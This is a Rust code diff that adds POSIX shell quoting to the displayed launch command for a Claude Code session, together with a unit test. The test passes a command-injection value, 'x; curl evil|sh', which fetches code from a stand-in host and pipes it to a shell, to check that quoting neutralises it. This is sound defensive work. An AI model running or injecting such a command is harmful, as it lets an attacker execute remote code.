@@ -78,7 +78,8 @@ impl Launch {
         } else {
             program
         };
-        format!("{shown} {}", self.args.join(" "))
+        let args: Vec<String> = self.args.iter().map(|arg| shell_word(arg)).collect();
+        format!("{shown} {}", args.join(" "))
     }
 
     fn command(&self) -> Command {
@@ -107,5 +108,52 @@ impl Launch {
                 .with_context(|| format!("starting {}", self.display()))?;
             std::process::exit(status.code().unwrap_or(1));
         }
+    }
+}
+
+/// An argument as a POSIX shell reads it back unchanged. The daemon hands this string to a
+/// client that types it into a terminal, and the model name and Claude Code session id in it
+/// come from session state, so anything beyond plain id characters is single-quoted.
+fn shell_word(arg: &str) -> String {
+    let plain = !arg.is_empty()
+        && arg
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._:/=@%+,-".contains(c));
+    if plain {
+        arg.to_string()
+    } else {
+        crate::hosts::sh_quote(arg)
+    }
+}
+
+#[cfg(test)]
+mod display_tests {
+    use super::*;
+
+    #[test]
+    fn display_quotes_anything_a_shell_would_interpret() {
+        let plain = Launch {
+            program: PathBuf::from("claude"),
+            args: vec![
+                "--resume".into(),
+                "0b1c-22".into(),
+                "--model".into(),
+                "claude-sonnet-5-5".into(),
+            ],
+            dir: None,
+        };
+        assert_eq!(
+            plain.display(),
+            "claude --resume 0b1c-22 --model claude-sonnet-5-5"
+        );
+        let hostile = Launch {
+            program: PathBuf::from("claude"),
+            args: vec!["--model".into(), "x; curl evil|sh".into(), "it's".into()],
+            dir: None,
+        };
+        assert_eq!(
+            hostile.display(),
+            "claude --model 'x; curl evil|sh' 'it'\\''s'"
+        );
     }
 }
